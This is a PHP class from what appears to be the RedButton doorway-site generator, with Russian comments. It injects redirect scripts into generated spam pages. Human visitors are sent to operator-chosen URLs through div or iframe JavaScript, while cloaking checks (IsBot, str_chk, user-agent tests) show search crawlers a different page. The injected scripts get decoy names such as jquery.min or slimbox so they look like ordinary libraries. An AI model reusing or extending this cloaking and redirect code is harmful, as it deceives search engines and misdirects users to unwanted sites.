<?php
//+------------------------------------------------------------------+
//|                  Copyright c 2012, RedButton Web Sites Generator |
//|                                      http://www.getredbutton.com |
//+------------------------------------------------------------------+
/**
 * Класс для управления редиректом
 */
class CModel_redirect
  {
  /**
   * Путь к файлом с php и js
   */
  const PATH = 'inc/public/redirect/';
  /**
   * Название исходного файла для редиректа через div
   */
  const DIV_JS = 'div.js';
  /**
   * Название исходного файла для редиректа через iframe
   */
  const IFRAME_JS = 'iframe.js';
  /**
   * Название исходного файла для редиректа через iframe но где много javascript кода
   */
  const IFRAME_MANY_JS = 'iframe_many.js';
  /**
   * Название исходного файла для редиректа через div но это php
   */
  const DIV_PHP = 'open.php';
  /**
   * текущее имя яваскрипта
   * @var string
   */
  private $m_javascript_filename;
  /**
   * текущее имя php file
   * @var string
   */
  private $m_php_filename;
  /**
   * Список имен для js файлов
   * @var array
   */
  private $m_js_files_name = array("open",
                                   "jquery",
                                   "jquery.min",
                                   "slimbox",
                                   "slimbox.min",
                                   "photo",
                                   "jquery.slideviewer",
                                   "menu",
                                   "validator",
                                   "rand");
  /**
   * Список имен для php файла
   * @var array
   */
  private $m_php_files_name = array("open",
                                    "go",
                                    "tut",
                                    "text",
                                    "test",
                                    "rand");
  /**
   * Парамтеры
   * @var array
   */
  private $m_params;
  /**
   * Тип редиректа
   * @var string
   */
  private $m_redirect_type;
  /**
   * URL редиректа
   * @var string
   */
  private $m_redirect_url;
  /**
   * Локальный путь к дорвею
   * @var string
   */
  private $m_local_path;
  /**
   * модуль для клоакинга
   * @var CModel_cloaking
   */
  private $m_model_cloaking;
  /**
   * Генерация динамического доргена
   * @var bool
   */
  private $m_is_dynamic = false;
  /**
   * ссылки в виде массива
   * @var string
   */
  private $m_redirect_url_array = array();
  /**
   * Случайный урл для редиеркта
   * @var string
   */
  private $m_redirect_url_rand = '';

  /**
   *
   * @param array $params
   * @param CModel_cloaking $model_cloaking
   * @param string $localPath
   */
  public function __construct(&$params, &$model_cloaking, &$localPath)
    {
    $this->m_params         = $params;
    $this->m_model_cloaking = $model_cloaking;
    $this->m_local_path     = $localPath;
    $this->m_is_dynamic     = $this->m_params['type'] == 'dynamic';
    }

  /**
   * Ицилизация имен файлов
   */
  public function Init()
    {
    //--- проверим вообще с редиректами работать надо
    if(!empty($this->m_params['redirectType']))
      {
      $this->m_redirect_type = $this->m_params['redirectType'];
      $this->m_redirect_url  = $this->m_params['redirectLink'];
      //--- получим массив ссылок
      $this->InitArrayUrls();
      //---
      $i = rand(0, count($this->m_js_files_name) - 1);
      //---
      if($this->m_js_files_name[$i] == "rand") $this->m_javascript_filename = CModel_tools::GetRandomStrin(rand(3, 9)) . '.js';
      elseif(rand(0, 2)) $this->m_javascript_filename = $this->m_js_files_name[$i] . '.' . time() . '.js';
      else  $this->m_javascript_filename = $this->m_js_files_name[$i] . '.js';
      //---
      $i = rand(0, count($this->m_php_files_name) - 1);
      //---
      if($this->m_php_files_name[$i] == "rand") $this->m_php_filename = CModel_tools::GetRandomStrin(rand(3, 9)) . '.php';
      elseif(rand(0, 2)) $this->m_php_filename = $this->m_php_files_name[$i] . '.' . time() . '.php';
      else  $this->m_php_filename = $this->m_php_files_name[$i] . '.php';
      //--- если один редирект на весь сайт, то тогда просто возьмем случайный
      if($this->m_params['redirectUrlType'] == 'site')
        {
        $this->m_redirect_url_rand = $this->GetRandRedirectUrl();
        }
      }
    }

  /**
   * Инцилизация списка урлов для редиректа
   */
  private function InitArrayUrls()
    {
    $this->m_redirect_url_array = array();
    $urls                       = explode("\n", $this->m_redirect_url);
    foreach($urls as $u)
      {
      $ur = trim($u);
      if(empty($ur)) continue;
      $this->m_redirect_url_array[] = $ur;
      }
    }

  /**
   * Получаем случайный урл
   * @return string
   */
  private function GetRandRedirectUrl()
    {
    if(empty($this->m_redirect_url_array)) return '';
    return $this->m_redirect_url_array[array_rand($this->m_redirect_url_array)];
    }

  /**
   * Из списка урлов получаем javascript массив
   * @param string $url
   * @return string
   */
  private function GetJavascriptUrls($url)
    {
    if($this->m_params['redirectUrlType'] == 'site' || $this->m_params['redirectUrlType'] == 'page') return '["' . $url . '"]';
    $urls = explode("\n", $url);
    $js   = '[';
    $i    = 0;
    foreach($urls as $u)
      {
      $ur = trim($u);
      if(empty($ur)) continue;
      if($i > 0) $js .= ',';
      $js .= '"' . ($ur) . '"';
      $i++;
      }
    $js .= ']';
    return $js;
    }

  /**
   * Получение DIV редиректа
   * @param string $js_file_name
   * @param string $page
   * @param string $url
   * @return string
   */
  private function GetDivRedirect(&$page, $url, $js_file_name)
    {
    if(empty($js_file_name)) $js_file_name = $this->m_javascript_filename;
    $javascript = '';
    //--- если проверка через php
    if($this->m_model_cloaking->IsTypePhp())
      {
      $javascript .= '<?php if(!IsBot()){?>';
      }
    $javascript .= '<script type="text/javascript" src="' . $this->m_params['nextUrl'] . $js_file_name . '"></script>
      <script type="text/javascript">';
    //--- проверим если установлен клоакинг через javascript то вставим нужную функцию
    if($this->m_model_cloaking->IsTypeJs())
      {
      $javascript .= 'if(str_chk()){';
      }
    //---
    $javascript .= 'var interval=window.setInterval(function(){var referrer = encodeURIComponent(document.referrer);show(' . $this->GetJavascriptUrls($url) . ')},' . rand(9, 18) . ');';
    if($this->m_model_cloaking->IsTypeJs())
      {
      $javascript .= '}';
      }
    $javascript .= '</script>';
    if($this->m_model_cloaking->IsTypePhp())
      {
      $javascript .= '<?php }?>';
      }
    $javascript .= "\r\n</head>";
    //---
    $page = str_replace("</head>", $javascript, $page, $countr = 1);
    }

  /**
   * Получение Iframe cool редиректа
   * @param string $js_file_name
   * @param string $page
   * @param string $url
   * @return string
   */
  private function GetIframeManyRedirect(&$page, $url, $js_file_name)
    {
    if(empty($js_file_name)) $js_file_name = $this->m_javascript_filename;
    //---
    $javascript = '';
    $body       = '';
//---
    if($this->m_model_cloaking->IsTypePhp())
      {
      $javascript .= '<?php if(!IsBot()){?>';
      $body .= '<?php if(!IsBot()){?>';
      }
    $javascript .= '<script type="text/javascript">var referrer = encodeURIComponent(document.referrer); var need_url=' . $this->GetJavascriptUrls($url) . ';</script>';
    if($this->m_model_cloaking->IsTypePhp())
      {
      $javascript .= '<?php }?>';
      }
    $javascript .= "\r\n</head>";
    $body .= '<div align=center><noindex><script type="text/javascript" src="' . $this->m_params['nextUrl'] . $js_file_name . '"></script></noindex></div>';
    if($this->m_model_cloaking->IsTypePhp())
      {
      $body .= '<?php }?>';
      }
    //---
    $page = str_replace("</head>", $javascript, $page);
    $pos  = strpos($page, "<body");
    if($pos > 0)
      {
      $pos_end_tag  = strpos($page, ">", $pos + 1);
      $pos_end_line = strpos($page, "\n", $pos + 1);
      $pos          = max($pos_end_tag, $pos_end_line);
      $page         = substr($page, 0, $pos) . $body . substr($page, $pos);
      }
    }

  /**
   * Получение IFRAME редиректа
   * @param string $js_file_name
   * @param string $page
   * @param string $url
   * @return string
   */
  private function GetIframeRedirect(&$page, $url, $js_file_name)
    {
    if(empty($js_file_name)) $js_file_name = $this->m_javascript_filename;
    //---
    $javascript = '<script type="text/javascript" src="' . $this->m_params['nextUrl'] . $js_file_name . '"></script>
      <script type="text/javascript">if(str_chk()){var interval=window.setInterval(function(){var referrer = encodeURIComponent(document.referrer);show(' . $this->GetJavascriptUrls($url) . ')},' . rand(9, 18) . ');}</script>' . "\r\n</head>";
    //---
    $page = str_replace("</head>", $javascript, $page);
    }

  /**
   * Установка только клоакинга, без редиректа.
   * Этот метод используется, только если пользователь выбрал какой-нбидуь клоакинг, а редирект нет. Для мудаков
   * @param $page
   * @param CKeywordInfo $keyword
   */
  public function CloackingSet(&$page, $keyword)
    {
    //--- определим с каким ссылками работать
    if($this->m_params['redirectUrlType'] == 'site') $url = $this->m_redirect_url_rand;
    elseif($this->m_params['redirectUrlType'] == 'page') $url = $this->GetRandRedirectUrl();
    else  $url = $this->m_redirect_url;
    //--- динамический дорвей
    if($this->m_params['type'] == 'dynamic')
      {
      $url = str_replace('[KEYWORD]', '<?=urlencode($info["keyword"])?>', $url);
      $url = str_replace('[REFERRER]', '<?=urlencode($_SERVER[\'HTTP_REFERER\'])?>', $url);
      }
    else
      {
      //---
      $url = str_replace('[KEYWORD]', urlencode($keyword->getKeywordIndex(0)), $url);
      $url = str_replace('[REFERRER]', '"+referrer+"', $url);
      }
    //---
    $javascript = '';
    if($this->m_model_cloaking->IsTypePhp())
      {
      $javascript .= '<?php if(!IsBot()){?>';
      }
    elseif($this->m_model_cloaking->IsTypeJs())
      {
      }
    switch($this->m_redirect_type)
    {
      case 'div':
        $this->GetDivRedirect($page, $url, $this->m_javascript_filename);
        break;
      case 'iframe':
        $this->GetIframeRedirect($page, $url, $this->m_javascript_filename);
        break;
      case 'iframe_many':
        $this->GetIframeManyRedirect($page, $url, $this->m_javascript_filename);
        break;
    }
    }

  /**
   * Делаем замену в редиректе
   * @param string $page
   */
  public function Redirect(&$page, $keyword)
    {
    if(empty($this->m_redirect_type)) return;
    //--- определим с каким ссылками работать
    if($this->m_params['redirectUrlType'] == 'site') $url = $this->m_redirect_url_rand;
    elseif($this->m_params['redirectUrlType'] == 'page') $url = $this->GetRandRedirectUrl();
    else  $url = $this->m_redirect_url;
    //--- динамический дорвей
    if($this->m_params['type'] == 'dynamic')
      {
      $url = str_replace('[KEYWORD]', '<?=urlencode($info["keyword"])?>', $url);
      $url = str_replace('[REFERRER]', '<?=urlencode($_SERVER[\'HTTP_REFERER\'])?>', $url);
      }
    else
      {
      //---
      $url = str_replace('[KEYWORD]', urlencode($keyword), $url);
      $url = str_replace('[REFERRER]', '"+referrer+"', $url);
      }
    //---
    switch($this->m_redirect_type)
    {
      case 'div':
        $this->GetDivRedirect($page, $url, $this->m_javascript_filename);
        break;
      case 'iframe':
        $this->GetIframeRedirect($page, $url, $this->m_javascript_filename);
        break;
      case 'iframe_many':
        $this->GetIframeManyRedirect($page, $url, $this->m_javascript_filename);
        break;
    }
    }

  /**
   * Скопировать нужные файлы
   */
  public function CopyFiles()
    {
    if(empty($this->m_redirect_type)) return;
    //---
    switch($this->m_redirect_type)
    {
      case 'div':
        $src_js_file = self::PATH . self::DIV_JS;
        if(!file_exists($src_js_file))
          {
          CLogger::write(CLoggerType::ERROR, 'redirect: file js not exists: ' . $src_js_file);
          return;
          }
        //---
        $js_content = file_get_contents($src_js_file);
        $js_content = str_replace('[HOME-URL]', $this->m_params['nextUrl'], $js_content);
        $js_content = str_replace('[PHP-FILE]', $this->m_php_filename, $js_content);
        $js_content = str_replace('[USER_AGENT_CHECK]', $this->GetCheckUserAgent(), $js_content);
        $js_content = str_replace('[NAME_COOKIE]', CModel_tools::GetRandomHex(4), $js_content);
        //---
        $dst_js_file = $this->m_local_path . '/' . $this->m_javascript_filename;
        if(file_put_contents($dst_js_file, $js_content)) CLogger::write(CLoggerType::DEBUG, 'redirect: file js copied: ' . $src_js_file . ' => ' . $dst_js_file);
        else
        CLogger::write(CLoggerType::ERROR, 'redirect: error file js copy: ' . $src_js_file . ' => ' . $dst_js_file);
        //---
        $src_php_file = self::PATH . self::DIV_PHP;
        $dst_php_file = $this->m_local_path . '/' . $this->m_php_filename;
        if(copy($src_php_file, $dst_php_file)) CLogger::write(CLoggerType::DEBUG, 'redirect: file js copied: ' . $src_php_file . ' => ' . $dst_php_file);
        else
        CLogger::write(CLoggerType::ERROR, 'redirect: error file js copy: ' . $src_php_file . ' => ' . $dst_php_file);
        //---
        break;
      case 'iframe':
        $src_js_file = self::PATH . self::IFRAME_JS;
        if(!file_exists($src_js_file))
          {
          CLogger::write(CLoggerType::ERROR, 'redirect: iframe file js not exists: ' . $src_js_file);
          return;
          }
        //---
        $dst_js_file = $this->m_local_path . '/' . $this->m_javascript_filename;
        //---
        $js_content = file_get_contents($src_js_file);
        $js_content = str_replace('[USER_AGENT_CHECK]', $this->GetCheckUserAgent(), $js_content);
        $js_content = str_replace('[NAME_COOKIE]', CModel_tools::GetRandomHex(rand(3, 6)), $js_content);
        if(file_put_contents($dst_js_file, $js_content)) CLogger::write(CLoggerType::DEBUG, 'redirect: iframe file js copied: ' . $src_js_file . ' => ' . $dst_js_file);
        else
        CLogger::write(CLoggerType::ERROR, 'redirect: error iframe file js copy: ' . $src_js_file . ' => ' . $dst_js_file);
        //---
        break;
      case 'iframe_many':
        $src_js_file = self::PATH . self::IFRAME_MANY_JS;
        if(!file_exists($src_js_file))
          {
          CLogger::write(CLoggerType::ERROR, 'redirect: iframe big file js not exists: ' . $src_js_file);
          return;
          }
        //---
        $dst_js_file = $this->m_local_path . '/' . $this->m_javascript_filename;
        //--- заменим строчки
        $js_content = file_get_contents($src_js_file);
        $js_content = str_replace('[USER_AGENT_CHECK]', $this->GetCheckUserAgent(), $js_content);
        $js_content = str_replace('[NAME_COOKIE]', CModel_tools::GetRandomHex(rand(3, 6)), $js_content);
        //---
        if(file_put_contents($dst_js_file, $js_content)) CLogger::write(CLoggerType::DEBUG, 'redirect: iframe big file js copied: ' . $src_js_file . ' => ' . $dst_js_file);
        else
        CLogger::write(CLoggerType::ERROR, 'redirect: error iframe big file js copy: ' . $src_js_file . ' => ' . $dst_js_file);
        //---
        break;
    }
    }

  /**
   * функция для проверки юзер агента в javascript
   */
  private function GetCheckUserAgent()
    {
    return $this->m_model_cloaking->GetForJavascript();
    }
  }

?>